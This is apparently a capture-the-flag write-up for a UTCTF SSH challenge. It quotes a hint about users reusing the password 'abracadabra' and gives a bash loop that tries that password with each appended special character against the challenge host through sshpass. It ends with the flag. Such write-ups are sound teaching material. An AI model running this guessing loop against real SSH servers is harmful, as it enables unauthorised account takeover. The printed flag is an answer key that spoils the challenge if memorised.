#### Challenge:

We've gathered a lot of information at this point, let get access through ssh. (ignore port 22, use 8822)

(Use of brute force is permitted for this problem, but please set the wait time in hydra so you don't overwhelm the server)

By Rob H (@Rob H on discord)

`betta.utctf.live:8822`

---

#### Solution:

- based on the clue from previous challenge we will try out different user/password combinations
    ```
    I don't understand the fasination with the magic phrase "abracadabra", but too many people are using them as passwords. 

    Crystal Ball
    Wade Coldwater
    Jay Walker
    Holly Wood

    Can you please reach out to them and get them to change thier passwords or at least get them append a special character? 
    ```

```bash
for user in 'wcoldwater' 'jwalker' 'cball' 'hwood'; do
    for pass in 'abracadabra' 'abracadabra~' 'abracadabra`' 'abracadabra!' 'abracadabra@' 'abracadabra#' 'abracadabra$' 'abracadabra%' 'abracadabra^' 'abracadabra&' 'abracadabra*' 'abracadabra(' 'abracadabra)' 'abracadabra-' 'abracadabra_' 'abracadabra+' 'abracadabra=' 'abracadabra{' 'abracadabra}' 'abracadabra[' 'abracadabra]' 'abracadabra|' 'abracadabra\\' 'abracadabra/' 'abracadabra:' 'abracadabra;' 'abracadabra"' "abracadabra'" 'abracadabra<' 'abracadabra>' 'abracadabra,' 'abracadabra.' 'abracadabra?'; do
        echo -n "${1}:${pass} -> "
        sshpass -p "${pass}" ssh -p 8822 ${user}@betta.utctf.live 
    done
done
```

---

<details><summary>FLAG:</summary>

```
utctf{cust0m3d-lsts-rule!}
```

</details>
<br/>
